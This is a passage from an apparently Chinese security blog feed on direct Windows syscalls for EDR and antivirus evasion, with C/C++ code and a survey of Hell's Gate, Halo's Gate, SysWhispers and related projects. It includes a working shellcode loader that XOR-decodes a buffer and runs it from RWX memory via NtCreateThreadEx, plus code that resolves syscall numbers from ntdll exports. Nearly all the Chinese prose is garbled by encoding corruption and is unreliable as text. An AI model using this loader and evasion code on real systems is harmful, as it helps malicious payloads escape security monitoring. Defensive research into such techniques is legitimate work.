class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)&amp;NtWriteVirtualMemoryProc;</span><br><span class="line">	</span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtCreateThreadExProc, FuncExample, <span class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)&amp;NtCreateThreadExProc;</span><br><span class="line">	</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	NTSTATUS status = NtAllocateVirtualMemoryEx(hProcess, &amp;Address, &amp;uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//è¿”å›é0</span></span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// è¿˜åŸå¼‚æˆ–</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">66</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	status = NtWriteVirtualMemory(hProcess, Address, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	NtCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)Address, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="é€šè¿‡dllå¯¼å‡ºè¡¨çš„æ–¹å¼è·å–å‡½æ•°åç§°åŠåœ°å€"><a href="#é€šè¿‡dllå¯¼å‡ºè¡¨çš„æ–¹å¼è·å–å‡½æ•°åç§°åŠåœ°å€" class="headerlink" title="é€šè¿‡dllå¯¼å‡ºè¡¨çš„æ–¹å¼è·å–å‡½æ•°åç§°åŠåœ°å€"></a>é€šè¿‡dllå¯¼å‡ºè¡¨çš„æ–¹å¼è·å–å‡½æ•°åç§°åŠåœ°å€</h5><p>æµç¨‹:</p>
<ul>
<li><ol>
<li>æ‰¾åˆ°æ¨¡å—åŸºåœ°å€</li>
</ol>
</li>
<li><ol start="2">
<li>è·å– IMAGE_DOS_HEADER  </li>
</ol>
</li>
<li><ol start="3">
<li>éå† IMAGE_NT_HEADER IMAGE_FILE_HEADER IMAGE_OPTIONAL_HEADER</li>
</ol>
</li>
<li><ol start="4">
<li>åœ¨ IMAGE_OPTIONAL_HEADERæ‰¾åˆ°å¯¼å‡ºè¡¨åœ°å€ åœ¨IMAGE_DATA_DIRECTORYä¸­ éšåå³å¯å¾—åˆ°ntdllçš„å¯¼å‡ºå‡½æ•°åŠå‡½æ•°åœ°å€</li>
</ol>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetPeHeader</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    PBYTE ImageBase;</span><br><span class="line">    PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">    PLDR_MODULE pLoadModule;</span><br><span class="line">    <span class="comment">// NTDLL</span></span><br><span class="line">    pLoadModule = (PLDR_MODULE)((PBYTE)Peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">    ImageBase = (PBYTE)pLoadModule-&gt;BaseAddress;</span><br><span class="line"></span><br><span class="line">    Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    <span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos-&gt;e_lfanew);</span><br><span class="line">    File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos-&gt;e_lfanew + <span class="keyword">sizeof</span>(DWORD)));</span><br><span class="line">    Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">    ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfFunctions));</span><br><span class="line">    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNames);</span><br><span class="line">    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-&gt; AddressOfNameOrdinals);</span><br><span class="line">    <span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; ExportTable-&gt;NumberOfNames; cx++) </span><br><span class="line">    &#123;</span><br><span class="line">        PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);</span><br><span class="line">        PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="Syscallé¡¹ç›®"><a href="#Syscallé¡¹ç›®" class="headerlink" title="Syscallé¡¹ç›®"></a>Syscallé¡¹ç›®</h4><h5 id="Hellâ€™s-Gate-åœ°ç‹±ä¹‹é—¨"><a href="#Hellâ€™s-Gate-åœ°ç‹±ä¹‹é—¨" class="headerlink" title="Hellâ€™s Gate  åœ°ç‹±ä¹‹é—¨"></a>Hellâ€™s Gate  åœ°ç‹±ä¹‹é—¨</h5><p><a href="https://github.com/am0nsec/HellsGate/">https://github.com/am0nsec/HellsGate/</a> </p>
<p>å¯¹äºæºç åˆ†æå¯ä»¥å‚è€ƒè¿™ä½å¸ˆå‚…çš„<a href="http://moonflower.fun/index.php/2022/10/31/339/">http://moonflower.fun/index.php/2022/10/31/339/</a></p>
<p>åŸç†:åœ¨PEBç»“æ„ä¸­è§£æInMemoryOrderModuleLIst æ‰¾åˆ°Ntdll.dllåœ°å€ è§£æç»“æ„åå†éå†å¯¼å‡ºè¡¨ æ ¹æ®å‡½æ•°åçš„hashæ‰¾åˆ°å‡½æ•°åœ°å€ å†é€šè¿‡0xb8è¿™ä¸ªæ“ä½œç å»åŠ¨æ€è·å–å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å· </p>
<p>ä½†æ˜¯å¦‚æœntdllè¢«ä¿®æ”¹æˆ–è€…è¢«hook æ‰¾ä¸åˆ°0xb8è¿™ä¸ªæ“ä½œç  é‚£ä¹ˆè¯¥æ–¹æ³•å°±æ²¡ç”¨äº†.</p>
<p><img src="/posts/b3138fd/9.png" alt="img"></p>
<h5 id="Haloâ€™s-Gate-å…‰ç¯ä¹‹é—¨"><a href="#Haloâ€™s-Gate-å…‰ç¯ä¹‹é—¨" class="headerlink" title="Haloâ€™s Gate å…‰ç¯ä¹‹é—¨"></a>Haloâ€™s Gate å…‰ç¯ä¹‹é—¨</h5><p><a href="https://github.com/boku7/AsmHalosGate">https://github.com/boku7/AsmHalosGate</a></p>
<p>åœ°ç‹±ä¹‹é—¨å®ç°äº†åŠ¨æ€çš„ç³»ç»Ÿè°ƒç”¨(4cb18d4b),ä½†æ˜¯ä¹Ÿæœ‰å±€é™:ntdll.dllå¿…é¡»é»˜è®¤æ˜¯è‡ªå·±çš„ å¦‚æœntdllè¢«ä¿®æ”¹è¿‡æˆ–è€…è¢«hookè¿‡(æ±‡ç¼–æ“ä½œç ä¸å†æ˜¯0xb8) ï¼Œé‚£ä¹ˆå°±æ— æ³•åŠ¨æ€è·å–ä»–çš„ç³»ç»Ÿè°ƒç”¨å·(SSN)ï¼Œè¿™ä¾¿å‡ºç°äº†å…‰ç¯ä¹‹é—¨ã€‚</p>
<p>åŸç†: EDRä¸ä¼šhookä½æ‰€æœ‰çš„NTå‡½æ•°ï¼Œæ€»ä¼šæœ‰ä¸æ•æ„Ÿçš„å‡½æ•°æ²¡æœ‰è¢«hook ï¼Œæ‰€ä»¥å¯ä»¥ä¸Šä¸‹å¾ªç¯éå†ï¼ˆ32å­—èŠ‚ï¼‰ã€é€’å½’ï¼Œæ‰¾åˆ°æ²¡æœ‰è¢«hookçš„é‚»å‡½æ•°ï¼Œ  ç„¶åè·å–ç³»ç»Ÿè°ƒç”¨å·å†å»å‡å»ç§»åŠ¨çš„æ­¥æ•°ï¼Œæœ€ç»ˆå¾—åˆ°æ‰€è¦æœç´¢çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</p>
<p>ä¸»è¦è¿˜æ˜¯æ ¹æ®syscallçš„ç‰¹å¾å­—èŠ‚ç 4C 8B D1 B8</p>
<h5 id="Tartarus-Gate"><a href="#Tartarus-Gate" class="headerlink" title="Tartarus Gate"></a>Tartarus Gate</h5><p><a href="https://github.com/trickster0/TartarusGate">https://github.com/trickster0/TartarusGate</a></p>
<p><a href="https://trickster0.github.io/posts/Halo&#39;s-Gate-Evolves-to-Tartarus-Gate/">https://trickster0.github.io/posts/Halo&#39;s-Gate-Evolves-to-Tartarus-Gate/</a> </p>
<p>å…‰ç¯ä¹‹é—¨çš„åŠ å¼º åªæ£€æµ‹ç¬¬ä¸€ä¸ªå­—èŠ‚å’Œç¬¬å››ä¸ªå­—èŠ‚æ˜¯å¦æ˜¯0xe9æ¥åˆ¤æ–­å‡½æ•°æ˜¯å¦è¢«hook</p>
<p><img src="/posts/b3138fd/10.png" alt="img"></p>
<h5 id="Spoofing-Gate-æ¬ºéª—ä¹‹é—¨"><a href="#Spoofing-Gate-æ¬ºéª—ä¹‹é—¨" class="headerlink" title="Spoofing-Gate æ¬ºéª—ä¹‹é—¨"></a>Spoofing-Gate æ¬ºéª—ä¹‹é—¨</h5><p><a href="https://github.com/timwhitez/Spoofing-Gate">https://github.com/timwhitez/Spoofing-Gate</a></p>
<p>ç”±äºæ˜¯goå†™çš„é¡¹ç›® çœ‹ä¸æ‡‚ä»£ç ã€‚ã€‚o(â•¥ï¹â•¥)o ç›´æ¥è´´å›¾ğŸŠç¥çš„äº†</p>
<p><img src="/posts/b3138fd/10-1.png" alt="img"></p>
<h5 id="ParallerSyscalls"><a href="#ParallerSyscalls" class="headerlink" title="ParallerSyscalls"></a>ParallerSyscalls</h5><p><a href="https://github.com/mdsecactivebreach/ParallelSyscalls">https://github.com/mdsecactivebreach/ParallelSyscalls</a></p>
<p><a href="https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/">https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/</a></p>
<p>ä½¿ç”¨Syscall ä»ç£ç›˜ä¸­è¯»å–ntdllï¼Œæœ€ååˆ©ç”¨LdrpThunkSignature å›å¤ç³»ç»Ÿè°ƒç”¨ã€‚åŒæ—¶å®ç°äº† dll çš„å¹¶è¡ŒåŠ è½½ï¼Œè¿‡ç¨‹ä¸­è¿è¡Œè¿›ç¨‹é€’å½’æ˜ å°„é€šè¿‡è¿›ç¨‹æ¨¡å—å¯¼å…¥è¡¨å¯¼å…¥ dll çš„è¿‡ç¨‹ã€‚</p>
<h5 id="SysWishpers2"><a href="#SysWishpers2" class="headerlink" title="SysWishpers2"></a>SysWishpers2</h5><p><a href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></p>
<p>python3 syswhispers.py -a x64  -o syscall -l masm -f NtCreateThreadEx</p>
<p><img src="/posts/b3138fd/11.png" alt="img"></p>
<p>åœ¨syscall.cä¸­ ä¸»è¦ç”¨åˆ°äº†ä¸¤ä¸ªå‡½æ•° SW2_PopulateSyscallList  SW2_GetSyscallNumber</p>
<p>SW2_PopulateSyscallList</p>
<p>é€šè¿‡PEBå·²åŠ è½½ntdllä¸­çš„å†…å­˜æœºåˆ¶</p>
<p><img src="/posts/b3138fd/12.png" alt="img"></p>
<p>éå†å†…å­˜ä¸­ntdllçš„å¯¼å‡ºè¡¨ è·å–zwå¼€å¤´çš„å‡½æ•°å å¹¶å­˜åˆ°Entriesä¸­</p>
<p><img src="/posts/b3138fd/13.png" alt="img"></p>
<p>å¯¹è¯¥å…¨å±€æ•°ç»„è¿›è¡Œå†’æ³¡å‡åºæ’åº</p>
<p><img src="/posts/b3138fd/14.png" alt="img"></p>
<p>SW2_GetSyscallNumber</p>
<p>åè€…å…ˆéå†SW2_PopulateSyscallListå‡½æ•°ä¸­çš„æ•°ç»„ï¼Œå¦‚æœHashç›¸ç­‰å°±è¿”å›å¾ªç¯çš„å€¼(SSN)</p>
<p><img src="/posts/b3138fd/15.png" alt="img"></p>
<h5 id="SysWishpers3"><a href="#SysWishpers3" class="headerlink" title="SysWishpers3"></a>SysWishpers3</h5><p><a href="https://github.com/klezVirus/SysWhispers3">https://github.com/klezVirus/SysWhispers3</a></p>
<p><img src="/posts/b3138fd/16.png" alt="img"></p>
<p>SW3_GetRandomSyscallAddress å‡½æ•°çš„ä¸»è¦ä½œç”¨æ˜¯å¾—åˆ°ä¸€ä¸ªéšæœºçš„ Native API çš„syscall æŒ‡ä»¤åœ°å€ï¼Œå…¶ä½™éƒ¨åˆ†å¤§éƒ½ç›¸åŒã€‚</p>
<p>å¯¹æ¯”ä¸‹è¿™ä¸¤ä¸ªç‰ˆæœ¬ç”Ÿæˆçš„masmæ–‡ä»¶ï¼Œå·¦å›¾ä¸º2ä»£ï¼Œå³å›¾ä¸º3ä»£</p>
<p><img src="/posts/b3138fd/17.png" alt="img"></p>
<p>åœ¨3ä»£çš„æ±‡ç¼–ä»£ç ä¸­éšè—äº†2ä»£ä¸­çš„syscall ret  ï¼Œè€Œæ˜¯å…ˆå°†ä¿å­˜syscallçš„åœ°å€ å¹¶éšæœºè·å–å…¶ä»– API stubs ä¸­çš„ syscall æŒ‡ä»¤ æœ€åé€šè¿‡jmpçš„æ–¹å¼è·³è½¬åˆ°syscallåœ°å€ï¼Œä»è€Œç»•è¿‡å¯¹éƒ¨åˆ†edrå¯¹syscallæŒ‡ä»¤çš„æ ‡è®°ã€‚(å³ä»å†…å­˜ä¸­åŠ¨æ€æ‰¾å‡ºæ›¿æ¢syscall)</p>
<p>EDRä¸ä»…ä¼šæ£€æµ‹Syscallçš„å­—ç¬¦ï¼Œè¿˜ä¼šæ£€æŸ¥syscallæ‰§è¡ŒæŒ‡å®šæŒ‡ä»¤çš„ä½ç½®ã€‚</p>
<p>APIè°ƒç”¨Syscallçš„æ­£å¸¸æµç¨‹å›¾å¦‚ä¸‹:</p>
<p><img src="/posts/b3138fd/18.png" alt="img"></p>
<p>è€Œå½“ä½¿ç”¨SysWhispersè°ƒç”¨å‡½æ•°æ—¶ï¼ŒsyscallæŒ‡ä»¤ä¼šç›´æ¥åœ¨ç¨‹åºçš„ä¸»æ¨¡å—æ‰§è¡Œ å¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="/posts/b3138fd/19.png" alt="img"></p>
<h5 id="GetSSN"><a href="#GetSSN" class="headerlink" title="GetSSN"></a>GetSSN</h5><p>é¢†ä¸€ç§å‘å…ˆSYscall Numberçš„æ–¹æ³•ï¼Œä¸éœ€è¦unhookã€ä¸éœ€è¦ä»ä»£ç æ ¹å­˜ä¸­è¯»å–ï¼Œä¹Ÿä¸éœ€è¦åŠ è½½Ntdllå‰¯æœ¬</p>
<p>å¯ä»¥å°†å®ƒç†è§£ä¸ºå…‰ç¯ä¹‹é—¨çš„å»¶ä¼¸   å¦‚æœä¸Šä¸‹é‚»å‡½æ•°éƒ½è¢«hookäº† å…‰ç¯ä¹‹é—¨è¿˜ä¼šç»§ç»­é€’å½’ï¼Œä¸æ–­å¯»æ‰¾æ²¡æœ‰è¢«hookçš„é‚»å‡½æ•°ï¼Œè€Œæœ€åçš„ç»“æ„å°±æ˜¯æ‰€æœ‰çš„å‡½æ•°(NT*)éƒ½è¢«hookäº†ï¼Œé‚£ä¹ˆæœ€åå°†ä¼šå‘ä¸Šé€’å½’åˆ°SSN=0çš„NTå‡½æ•°ã€‚</p>
<p>é¦–å…ˆéœ€è¦äº†è§£:</p>
<ol>
<li>æ‰€æœ‰çš„Ntå‡½æ•°å’ŒZwåŒåå‡½æ•°å®é™…ä¸Šæ˜¯ç­‰ä»·çš„</li>
<li>Ntå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·å®é™…ä¸Šæ˜¯å’ŒZwå‡½æ•°æŒ‰ç…§åœ°å€é¡ºåºçš„æ’åˆ—ä¹Ÿæ˜¯ä¸€æ ·çš„</li>
</ol>
<p><img src="/posts/b3138fd/20.png" alt="img"></p>
<p>å› æ­¤ æˆ‘ä»¬åªéœ€è¦éå†æ‰€æœ‰Zwå‡½æ•°ï¼Œè®°å½•å…¶å‡½æ•°åå’Œå‡½æ•°åœ°å€ï¼Œæœ€åå®‰è£…å‡½æ•°åœ°å€å‡åºæ’åˆ—åï¼Œæ¯ä¸ªå‡½æ•°çš„SSNå°±æ˜¯å¯¹åº”çš„æ’åˆ—é¡ºåº</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;peb.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetSSN</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::map&lt;<span class="type">int</span>, string&gt; Nt_Table;</span><br><span class="line">	PBYTE ImageBase;</span><br><span class="line">	PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//64ä½çš„PEBæŒ‡é’ˆ</span></span><br><span class="line">	PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">	PLDR_MODULE pLoadModule;</span><br><span class="line">	<span class="comment">// NTDLL</span></span><br><span class="line">	pLoadModule = (PLDR_MODULE)((PBYTE)Peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">	ImageBase = (PBYTE)pLoadModule-&gt;BaseAddress;</span><br><span class="line"></span><br><span class="line">	Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">	<span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos-&gt;e_lfanew);</span><br><span class="line">	File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos-&gt;e_lfanew + <span class="built_in">sizeof</span>(DWORD)));</span><br><span class="line">	Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="built_in">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">	ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line">	</span><br><span class="line">	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfFunctions));</span><br><span class="line">	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNames);</span><br><span class="line">	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNameOrdinals);</span><br><span class="line">	<span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; ExportTable-&gt;NumberOfNames; cx++)</span><br><span class="line">	&#123;</span><br><span class="line">		PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);</span><br><span class="line">		PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strncmp</span>((<span class="type">char</span>*)pczFunctionName, <span class="string">&quot;Zw&quot;</span>, <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">			Nt_Table[(<span class="type">int</span>)pFunctionAddress] = (string)pczFunctionName;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (std::map&lt;<span class="type">int</span>, string&gt;::iterator iter = Nt_Table.<span class="built_in">begin</span>(); iter != Nt_Table.<span class="built_in">end</span>(); ++iter) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;index:&quot;</span> &lt;&lt; index &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">		index += <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">GetSSN</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b3138fd/21.png" alt="img"></p>
<h5 id="HWSyscalls-åç»­å®Œå–„"><a href="#HWSyscalls-åç»­å®Œå–„" class="headerlink" title="HWSyscalls(åç»­å®Œå–„)"></a>HWSyscalls(åç»­å®Œå–„)</h5><p><a href="https://github.com/Dec0ne/HWSyscalls/">https://github.com/Dec0ne/HWSyscalls/</a></p>
<p>ä»Šæ—¥é€›redditæ— æ„é—´å‘ç°çš„æ–°é¡¹ç›®ï¼ŒHWSyscallsæ˜¯ä¸€ç§ä½¿ç”¨HWBPã€HalosGateå’Œå¸¦æœ‰HWBPçš„kernel32ä¸Šçš„åˆæˆè·³æ¿æ‰§è¡Œé—´æ¥syscallsçš„æ–°æ–¹æ³•</p>
<p>  åç»­æœ‰æ—¶é—´çš„è¯å†çœ‹ä¸‹</p>
<h4 id="Syscallæ£€æµ‹ï¼ˆåç»­å®Œå–„ï¼‰"><a href="#Syscallæ£€æµ‹ï¼ˆåç»­å®Œå–„ï¼‰" class="headerlink" title="Syscallæ£€æµ‹ï¼ˆåç»­å®Œå–„ï¼‰"></a>Syscallæ£€æµ‹ï¼ˆåç»­å®Œå–„ï¼‰</h4><p><a href="https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida">https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida</a></p>
<p>åœ¨ntdll.dllä¸­çš„ç³»ç»Ÿè°ƒç”¨ä¸€èˆ¬éƒ½ä¼šéµå¾ªç»“æ„ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov r10, rcx</span><br><span class="line">mov eax, ã€ŒSyscall Numberã€</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>fridaæ²¡æ¥è§¦è¿‡ åé¢ç ”ç©¶ä¸‹</p>
<h4 id="Referernces"><a href="#Referernces" class="headerlink" title="Referernces"></a>Referernces</h4><p><a href="https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav">https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav</a></p>
<p><a href="https://myzxcg.com/2022/01/Windows-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0/">https://myzxcg.com/2022/01/Windows-ç³»ç»Ÿè°ƒç”¨åˆ†æä¸å…æ€å®ç°/</a></p>
<p><a href="http://moonflower.fun/index.php/2022/10/31/339/">http://moonflower.fun/index.php/2022/10/31/339/</a></p>
<p><a href="https://bbs.pediy.com/thread-223023.htm">https://bbs.pediy.com/thread-223023.htm</a></p>
<p><a href="https://idiotc4t.com/defense-evasion/dynamic-get-syscallid">https://idiotc4t.com/defense-evasion/dynamic-get-syscallid</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1470904">https://cloud.tencent.com/developer/article/1470904</a></p>
<p><a href="https://tttang.com/archive/1464/">https://tttang.com/archive/1464/</a></p>
<p><a href="https://forum.butian.net/share/1014">https://forum.butian.net/share/1014</a></p>
<p><a href="https://trickster0.github.io/posts/Halo&#39;s-Gate-Evolves-to-Tartarus-Gate/">https://trickster0.github.io/posts/Halo&#39;s-Gate-Evolves-to-Tartarus-Gate/</a></p>
<p><a href="https://www.ctfiot.com/84964.html">https://www.ctfiot.com/84964.html</a></p>
]]></content>
      <categories>
        <category>Syscall</category>
      </categories>
      <tags>
        <tag>Syscall</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿›ç¨‹è‡ªåˆ›å»º</title>
    <url>/posts/e5191117/</url>
    <content><![CDATA[<p>é€šè¿‡çˆ¶è¿›ç¨‹åˆ›å»ºä¸€ä¸ªåŒåçš„å­è¿›ç¨‹ï¼ˆè¿›ç¨‹çš„è‡ªåˆ›å»ºï¼‰</p>
<h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><p>1ã€è·å–çˆ¶è¿›ç¨‹çš„æ¨¡å—è·¯å¾„<br>2ã€çˆ¶è¿›ç¨‹ä»¥æŒ‚èµ·çŠ¶æ€åˆ›å»ºå­è¿›ç¨‹ï¼ˆéœ€è¦æ³¨æ„ï¼Œå› ä¸ºæ˜¯çˆ¶è¿›ç¨‹å®ç°è‡ªæˆ‘åˆ›å»ºï¼Œä¹Ÿå°±æ˜¯è¯´çˆ¶è¿›ç¨‹åˆ›å»ºçš„è¿›ç¨‹ä¹Ÿæ˜¯ä»–è‡ªå·±ï¼Œæ‰€ä»¥å½“çˆ¶è¿›ç¨‹ä»¥æŒ‚èµ·çŠ¶æ€åˆ›å»ºå­è¿›ç¨‹çš„æ—¶å€™ï¼Œçˆ¶è¿›ç¨‹æ­¤æ—¶æœ¬èº«ä¹Ÿæ˜¯å¤„äºæŒ‚èµ·çŠ¶æ€çš„ï¼‰<br>3ã€è·å–æ­¤æ—¶çˆ¶è¿›ç¨‹çš„è¿›ç¨‹ä¸Šä¸‹æ–‡æ¥å½“ä½œå­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡<br>4ã€è®¾ç½®å­è¿›ç¨‹ä¸Šä¸‹æ–‡çš„Eip/RIp(x64)<br>5ã€æ¢å¤ç°åœº(è®¾ç½®ä¸Šä¸‹æ–‡ï¼Œæ¢å¤çº¿ç¨‹)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ChildProcess</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;å­è¿›ç¨‹åˆ›å»ºæˆåŠŸ&quot;</span>, <span class="string">&quot;å­è¿›ç¨‹åˆ›å»ºæˆåŠŸ&quot;</span>, MB_OK);</span><br><span class="line">	Sleep(<span 